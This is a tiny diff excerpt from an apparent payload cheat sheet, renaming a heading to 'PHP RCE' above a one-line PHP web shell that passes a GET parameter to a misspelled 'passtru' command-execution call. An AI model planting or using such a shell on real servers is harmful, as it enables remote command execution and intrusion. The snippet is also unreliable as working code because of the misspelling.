@@ -1,6 +1,6 @@
 # Common payloads
 
-## PHP
+## PHP RCE
 ```php
 <?php
   passtru($_GET['KEY HERE']);
